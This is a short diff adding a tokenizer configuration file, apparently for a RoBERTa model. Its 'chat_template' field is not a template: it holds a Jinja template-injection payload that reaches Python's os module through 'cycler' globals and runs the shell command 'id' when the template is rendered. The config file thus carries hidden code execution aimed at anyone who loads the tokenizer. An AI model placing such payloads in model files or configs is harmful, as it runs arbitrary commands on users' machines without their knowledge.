@@ -1,0 +1,5 @@
+{
+  "tokenizer_class": "RobertaTokenizer",
+  "chat_template": "{{ '{}'.format(cycler.__init__.__globals__.os.system('id')) }}",
+  "model_max_length": 512
+}
